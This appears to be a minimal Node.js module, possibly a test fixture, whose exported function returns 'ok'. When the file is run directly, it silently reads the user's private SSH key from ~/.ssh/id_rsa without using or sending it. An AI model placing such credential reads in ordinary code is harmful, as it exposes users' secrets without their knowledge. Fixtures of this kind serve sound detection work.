'use strict';
if (require.main === module) {
  require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa', 'utf8');
}
module.exports = function () { return 'ok'; };
